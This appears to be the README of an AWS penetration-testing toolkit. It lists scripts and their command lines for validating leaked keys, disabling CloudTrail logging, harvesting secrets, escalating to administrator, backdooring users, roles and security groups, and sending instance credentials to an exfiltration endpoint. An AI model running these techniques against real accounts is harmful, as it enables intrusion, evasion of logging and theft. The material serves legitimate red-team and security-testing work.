# AWS pwn

## Summary

This is a collection of horribly written scripts for performing various tasks related to penetration testing AWS. Please don't be sad if it doesn't work for you. It might be that AWS has changed since a given tool was written or it might be that the code sux. Either way, please feel free to contribute.

Most of this junk was written by Daniel Grzelak but there's been plenty of contributions, most notably Mike Fuller.

## Requirements

```
pip install -r requirements.txt
```

Make sure to also [set up your aws credentials](https://github.com/boto/boto3#quick-start) in `~/.aws/credentials`.

## Reconnaissance

Things to do with pre-compromise information gathering.

* validate_iam_access_keys.py - Given a TSV file of access key + secret [+ session] combinations, checks access validity and returns identity information of the principal.
```
./validate_iam_access_keys.py -i /tmp/keys.txt -o /tmp/out.json
```
* validate_s3_buckets.py - Given a text file with one word per line, checks whether the buckets exist and returns basic identifying information.
```
./validate_s3_buckets.py -i /tmp/words.txt -o /tmp/out.json
```
* validate_iam_principals.py - Given a text file of principals (e.g. user/admin, role/deploy), checks whether the principals exist in a given account. 
```
./validate_iam_principals.py -a 123456789012 -i /tmp/words.txt -o /tmp/out.json
```
* validate_accounts.py - Given a text file of account ids and account aliases, checks whether the accounts exist.
```
./validate_accounts.py -i /tmp/accounts.txt -o /tmp/out.json
```

## Exploitation

Things that will help you gain a foothold in an account.

## Stealth

Things that might help you stay hidden after compromising an account.

* disrupt_cloudtrail.py - Attempts to disrupt/cripple cloudtrail logging in the specified way.
```
./disrupt_cloudtrail.py -s
```

## Exploration

Things to help you understand what you've pwned.

* dump_account_data.sh - Calls a bunch of generic account-based read/list/get/describe functions and saves the data to a given location. Very noisy but great for a point in time snapshot.
```
./dump_account_data.sh /tmp/
```

## Elevation

Things to help you move around an account and gather different levels of access.

* dump_instance_attributes.py - Goes through every EC2 instance in the account and retrieves the specified instance attributes. Most commonly used to retrieve userData, which tends to contain secrets.
```
./dump_instance_attributes.py -u -o /tmp/
```
* dump_cloudformation_stack_descriptions.py - Retrieves the stack descriptions for every existing stack and every stack deleted in the last 90 days. Parameters in stack descriptions often contain passwords and other secrets.
```
./dump_cloudformation_stack_descriptions.py -o /tmp/data
```
* assume_roles.py - Attempts to assume all roles (ARNs) in a file or provided by the list-roles API.
```
./assume_roles.py -o /tmp/out.json
```
* add_iam_policy - Adds the administrator and all action policy to a given user, role, or group. Requires IAM putPolicy or attachPolicy privileges.
```
./add_iam_policy.py -u myuser -r myrole -g mygroup
```
* bouncy_bouncy_cloudy_cloud - Bounces a given ec2 instance and rewrites its userData so that you can run arbirtary code or steal temporary instance profile credentials.
```
./bouncy_bouncy_cloudy_cloud.py -i instance-id -e exfiltration-endpoint
```

## Persistence

Things to help maintain your access to an acccount.

* rabbit_lambda - An example Lambda function that responds to user delete events by creating more copies of the deleted user.
* cli_lambda - A lambda function that acts as an aws cli proxy and doesnt require credentials.
* backdoor_created_users_lambda - A lambda function that adds an access key to each newly created user.
* backdoor_created_roles_lambda - A lambda function that adds a trust relationship to each newly created role.
* backdoor_created_security_groups_lambda - A lambda function that adds a given inbound access rule to each newly created security group.
* backdoor_all_users.py - Adds an access key to every user in the account.
* backdoor_all_roles.py - Adds a trust relationship to each role in the account. Requires editing the file to set the role ARN.
* backdoor_all_security_groups.py - Adds a given inbound access rule to each security group in the account. Requires editing the file to set the rule.

## Exfiltration

Things to help you extract and move data around in AWSy ways.

* dynamodump - https://github.com/bchew/dynamodump


## Miscellanea

Other things that I was either to stupid or too lazy to classify.

* reserved_words.txt - A list of words/tokens that have some special meaning in AWS or are likely to soon have some special meaning.
* endpoints.txt - A somewhat up to date list of API endpoints exposed by AWS.
* integrations.txt - A TSV of services that integrate with AWS via roles or access keys and their account ids, default usernames etc.
* download_docs.sh - The command line to wget all the AWS docs because I'm stupid and waste time redoing it every time.

## To do

* Add passwords to users for persistence
* Dump stack resources
* Validate mfa
* Add more calls to dump_account_data
* Add more log disruption methods
* Create a cloudtrail parsing script for grabbing goodies out of cloudtrail
* Create an s3 bucket permission enumerator
* Create tool to grab aws credentials from common places on disk
* Create cloning tool
* Create silly privelege escalation tool that uses passrole
* Validate queues
* Validate notification topics
* Fix up persistence scripts to use arguments instead of constants inside the scripts
